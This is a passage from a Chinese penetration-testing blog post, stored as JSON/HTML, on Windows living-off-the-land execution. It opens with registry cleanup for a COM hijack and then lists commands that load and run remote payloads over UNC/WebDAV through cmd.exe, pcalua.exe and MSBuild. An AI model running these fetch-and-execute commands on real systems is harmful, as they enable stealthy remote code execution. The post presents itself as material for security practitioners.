HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125; /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg delete HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;372FCE38-4324-11D0-8810-00A0C903B83C&#125;\\TreatAs /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Done!</span><br></pre></td></tr></table></figure></p>\n<hr>\n\n<h4 id=\"0x02-补充方式\"><a href=\"#0x02-补充方式\" class=\"headerlink\" title=\"0x02 补充方式\"></a>0x02 补充方式</h4><p>描述:采用当使用UNC/WebDAV时候多的几种姿势可以利用其来执行可执行脚本<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd.exe /k &lt; \\\\webdavserver\\folder\\batchfile.txt (不能复现)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pcalua.exe：</span></span><br><span class=\"line\">pcalua.exe -a \\\\server\\payload.dll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Msbuild</span></span><br><span class=\"line\">cmd /V /c <span class=\"string\">\"set MB=\"</span>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe<span class=\"string\">\" &amp; !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml &gt; payload.xml &amp; !MB! payload.xml\"</span></span><br></pre></td></tr></table></figure></p>\n<hr>\n\n<h4 id=\"0x04-参考来源\"><a href=\"#0x04-参考来源\" class=\"headerlink\" title=\"0x04 参考来源\"></a>0x04 参考来源</h4><p><a href=\"https://evi1cg.me/archives/remote_exec.html\" target=\"_blank\" rel=\"noopener\">https://evi1cg.me/archives/remote_exec.html</a></p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"渗透总结","path":"api/categories/渗透总结.json"}],"tags":[{"name":"文件上传","path":"api/tags/文件上传.json"}]}